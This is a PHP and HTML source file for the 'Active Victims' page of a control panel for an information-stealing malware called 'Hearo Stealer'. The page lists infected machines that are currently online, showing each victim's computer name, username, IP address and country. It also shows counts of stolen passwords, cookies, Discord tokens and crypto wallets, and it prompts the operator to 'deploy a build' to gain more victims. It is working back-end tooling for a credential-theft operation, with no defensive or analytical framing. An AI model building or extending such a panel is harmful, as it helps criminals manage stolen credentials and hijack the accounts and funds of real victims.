<?php
require_once 'xeff/includes/config.php';
require_once 'xeff/includes/auth.php';
requireAuth();

// Get logs from last 10 minutes (Active) based on heartbeat
$stmt = $db->query("SELECT * FROM logs WHERE datetime(last_heartbeat) >= datetime('now', '-10 minutes') ORDER BY last_heartbeat DESC");
$logs = $stmt->fetchAll(PDO::FETCH_ASSOC);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Active Victims — Hearo Stealer</title>
    <link rel="icon" href="xeff/assets/logo.png" type="image/png">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="xeff/css/elite.css">
    <link rel="stylesheet" href="xeff/assets/theme.css">
    <style>
        .pulse { display: inline-block; width: 8px; height: 8px; background: #10b981; border-radius: 50%; margin-right: 8px; animation: pulse-glow 2s ease-in-out infinite; }
        @keyframes pulse-glow { 0%, 100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.4); } 50% { box-shadow: 0 0 0 8px rgba(16, 185, 129, 0); } }
        .auto-refresh-badge { display: inline-flex; align-items: center; gap: 6px; background: rgba(16,185,129,0.08); border: 1px solid rgba(16,185,129,0.15); padding: 4px 12px; border-radius: 99px; font-size: 10px; font-family: var(--mono); color: #10b981; }
    </style>
</head>
<body>
    <div class="ambient-glow"></div>
    <div class="noise"></div>

    <?php include 'xeff/includes/navbar.php'; ?>

    <div class="container">
        <header>
            <h1>Active Sessions</h1>
            <p>Live target connections &middot; <span class="auto-refresh-badge"><i class="fa-solid fa-arrows-rotate"></i> Auto-refresh 30s</span></p>
        </header>

        <div class="table-header-flex">
            <div class="table-title"><div class="pulse"></div> Online Targets</div>
            <div class="table-count"><?= count($logs) ?> targets live</div>
        </div>

        <div class="data-table-container">
            <table>
                <thead>
                    <tr>
                        <th>Machine & User</th>
                        <th>Status</th>
                        <th>IP & Location</th>
                        <th>Credentials</th>
                        <th>Last Seen</th>
                        <th style="text-align: right;">Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php if (empty($logs)): ?>
                    <tr><td colspan="6" style="text-align:center; color:rgba(255,255,255,0.3); padding: 40px;">No active victims right now. Deploy a build to start.</td></tr>
                    <?php else: ?>
                        <?php foreach($logs as $log): ?>
                        <tr>
                            <td>
                                <div class="cell-machine">
                                    <i class="fa-solid fa-desktop"></i>
                                    <div class="cell-info">
                                        <span class="cell-title"><?= sanitize($log['computer_name']) ?></span>
                                        <span class="cell-sub"><?= sanitize($log['username']) ?></span>
                                    </div>
                                </div>
                            </td>
                            <td><div class="tag-owner"><i class="fa-solid fa-circle"></i> LIVE</div></td>
                            <td>
                                <div class="cell-info">
                                    <span class="cell-title"><?= sanitize($log['ip']) ?></span>
                                    <span class="cell-sub"><?= sanitize($log['country']) ?> &middot; <?= sanitize($log['os_version']) ?></span>
                                </div>
                            </td>
                            <td>
                                <div class="cred-badges">
                                    <div class="cred-badge"><i class="fa-solid fa-key"></i> <?= $log['passwords_count'] ?></div>
                                    <div class="cred-badge"><i class="fa-solid fa-cookie"></i> <?= $log['cookies_count'] ?></div>
                                    <?php if ($log['discord_tokens'] > 0): ?><div class="cred-badge"><i class="fa-brands fa-discord"></i> <?= $log['discord_tokens'] ?></div><?php endif; ?>
                                    <?php if ($log['crypto_wallets'] > 0): ?><div class="cred-badge"><i class="fa-solid fa-wallet"></i> <?= $log['crypto_wallets'] ?></div><?php endif; ?>
                                </div>
                            </td>
                            <td class="time-cell"><?= date('H:i:s', strtotime($log['last_heartbeat'] ?? $log['captured_at'])) ?></td>
                            <td>
                                <div class="actions">
                                    <a href="view_session.php?session=<?= urlencode($log['session_hash']) ?>" class="btn-action"><i class="fa-regular fa-eye"></i> View</a>
                                    <button class="btn-action btn-delete" onclick="deleteLog('<?= sanitize($log['session_hash']) ?>', this)"><i class="fa-regular fa-trash-can"></i></button>
                                </div>
                            </td>
                        </tr>
                        <?php endforeach; ?>
                    <?php endif; ?>
                </tbody>
            </table>
        </div>
    </div>

    <script>
        // Auto-refresh every 30 seconds
        setTimeout(() => location.reload(), 30000);

        function deleteLog(hash, btn) {
            if (!confirm('Delete this log permanently?')) return;
            const row = btn.closest('tr');
            fetch('delete_log.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: 'session_hash=' + encodeURIComponent(hash)
            })
            .then(r => r.json())
            .then(d => {
                if (d.status === 'deleted') {
                    row.style.opacity = '0';
                    setTimeout(() => row.remove(), 300);
                } else {
                    alert(d.error || 'Failed to delete');
                }
            })
            .catch(() => alert('Network error'));
        }
    </script>
</body>
</html>
